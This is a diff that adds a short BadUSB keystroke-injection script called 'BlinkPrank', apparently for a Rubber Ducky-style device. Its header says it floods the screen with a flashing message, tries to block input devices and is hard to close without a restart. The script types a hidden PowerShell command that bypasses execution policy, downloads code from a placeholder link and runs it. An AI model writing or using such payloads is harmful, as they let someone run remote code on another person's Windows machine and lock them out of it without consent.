@@ -1,0 +1,13 @@
+REM ┌────────────────────────────────────────────────────────────┐
+REM │ BlinkPrank | github.com/hooker01                           │
+REM │ Description: Creates a full-screen flashing window with    │
+REM │ a custom message, attempting to block input devices.       │
+REM │ Designed to be difficult to close without a restart.       │
+REM │ Target: Windows 8.1                                        │
+REM └────────────────────────────────────────────────────────────┘
+
+ESC
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C "$text='WRITE_YOUR_TEXT'; irm LINK | iex"
+ENTER
